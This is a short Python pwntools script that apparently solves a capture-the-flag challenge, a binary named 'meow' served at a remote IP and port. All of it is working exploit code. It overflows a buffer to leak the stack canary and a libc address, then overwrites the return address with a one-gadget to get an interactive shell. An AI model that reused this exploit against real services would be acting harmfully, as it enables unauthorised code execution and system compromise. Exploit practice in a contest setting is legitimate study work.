from pwn import *

def adopt(breed, name, age, profile):
    p.sendlineafter('>', '1')
    p.sendafter('breed', breed)
    p.sendafter('name', name)
    p.sendlineafter('age', str(age))
    p.sendafter('profile', profile)

def view():
    p.sendlineafter('>', '2')

#p = process('./meow')
p = remote('1.224.175.13', 9980)
e = ELF('./meow')
l = e.libc

#context.log_level = 'debug'

adopt('1'*0x8, '2'*0x11, 0x1337, '3'*0x8)
view()

p.recvuntil('2'*0x10)
canary = u64(p.recv(8)) - ord('2')
print hex(canary)

p.sendlineafter('>', '3')
p.sendlineafter('>', '2')
p.sendafter('name', 'a'*0x20)

view()

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x21b97
magic = libc + 0x4f322
print hex(libc)

p.sendlineafter('>', '3')
p.sendlineafter('>', '2')
p.sendafter('name', 'a'*0x10+p64(canary)+p64(magic)*2)

p.sendlineafter('>', '5')

p.interactive()